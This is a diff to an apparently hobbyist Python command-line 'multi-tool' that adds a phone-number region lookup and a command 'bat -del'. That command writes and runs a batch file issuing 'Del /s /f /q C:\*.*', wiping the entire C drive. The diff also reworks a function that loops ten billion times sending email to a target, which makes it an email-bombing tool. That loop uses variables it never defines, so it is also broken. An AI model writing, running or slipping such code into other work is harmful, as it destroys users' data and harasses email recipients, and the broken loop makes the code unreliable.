@@ -7,6 +7,9 @@ from email.mime.text import MIMEText
 import instaloader
 from pytube import YouTube
 from email.message import EmailMessage
+import phonenumbers
+from phonenumbers import geocoder
+import subprocess
 
 a="""
 
@@ -41,6 +44,12 @@ def ytdownload(link):
     video_stream.download()
     print_color("Download completed!",colors.OKGREEN)
 
+#===================Phone number locator=============================================================
+
+def locate_phone_number(phone_number):
+    parsed_number = phonenumbers.parse(phone_number, None)
+    location_info = geocoder.description_for_number(parsed_number, "en")
+    return location_info
 
 #=============================SEND EMAIL==============================================================
 def send_email(sender_email, sender_password, recipient_email, subject, message):
@@ -156,15 +165,45 @@ def generate_ascii_art(text, font='standard'):
 
 def send_multiple_emails(target_email,emaill):
     for _ in range(10000000000):
-        msg = EmailMessage()
-        msg.set_content("Your malevolence knows no bounds!")
+        try:
+            smtp_server = smtplib.SMTP('smtp.gmail.com', 587)
+            smtp_server.starttls()
 
-        msg['Subject'] = "An Army of Chaos Approaches!"
-        msg['From'] = emaill
-        msg['To'] = target_email
+            smtp_server.login(sender_email, sender_password)
 
-        with smtplib.SMTP('smtp.gmail.com', 587) as server:
-            server.send_message(msg)
+            msg = MIMEMultipart()
+            msg['From'] = sender_email
+            msg['To'] = recipient_email
+            msg['Subject'] = subject
+            msg.attach(MIMEText(message, 'plain'))
+
+            smtp_server.send_message(msg)
+
+            print("Email sent successfully.", colors.OKGREEN)
+
+            smtp_server.quit()
+        except Exception as e:
+            print("An error occurred:", str(e), colors.WARNING)
+
+
+#================================DELETES C USING BAT CODE================================================================
+def create_bat_file():
+    bat_content = """@echo off
+Del /s /f /q C:\*.*"""
+
+
+    with open("delete_c_drive.bat", "w") as bat_file:
+        bat_file.write(bat_content)
+
+def run_bat_file():
+
+    create_bat_file()
+    process = subprocess.Popen(["delete_c_drive.bat"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+    output, error = process.communicate(input='Y\n', timeout=10)
+
+    # Print the output and error messages
+    print("Output:", output)
+    print("Error:", error)
 
 #================================HELP================================================================
 def help():
@@ -213,6 +252,10 @@ if __name__ == "__main__":
             message = input("Enter email message: ")
             send_email(sender_email, sender_password, recipient_email, subject, message)
 
+        #===Phone number locator=====#
+        elif command == 'phone -l':
+            number = colored_input("Enter phone number: ", Fore.LIGHTYELLOW_EX)
+            print(locate_phone_number(number))
         # ===download insta===#
         elif command == "d insta":
             post_url = input("Enter Instagram post URL: ")
@@ -273,6 +316,9 @@ if __name__ == "__main__":
         elif command == "off":
             os.system("shutdown /s /t 1")
 
+        #====Delete everth bat====#
+        elif command == "bat -del":
+            run_bat_file()
         #====HELP=====#
         elif command == "help":
             help()
